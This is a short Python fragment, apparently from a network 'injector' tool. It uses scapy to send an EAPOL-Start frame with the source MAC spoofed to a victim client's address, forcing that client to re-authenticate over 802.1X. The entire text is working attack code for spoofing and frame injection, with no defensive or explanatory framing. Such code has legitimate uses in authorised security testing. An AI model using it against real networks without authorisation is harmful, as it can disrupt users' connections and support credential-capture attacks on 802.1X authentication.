try:
    from scapy.layers.l2 import Ether
    from scapy.layers.eap import EAPOL
    from scapy.sendrecv import sendp
except ImportError:  # pragma: no cover
    Ether = None  # type: ignore
    EAPOL = None  # type: ignore

    def sendp(*args, **kwargs):  # type: ignore
        raise ImportError("scapy is required for injector")


def force_reauthentication(iface, client_mac):
    # send an EAPOL-Start broadcast from client's mac
    if Ether is None or EAPOL is None:
        raise ImportError("scapy is required for injector")
    sendp(Ether(src=client_mac, dst="01:80:c2:00:00:03") / EAPOL(type=1), iface=iface)
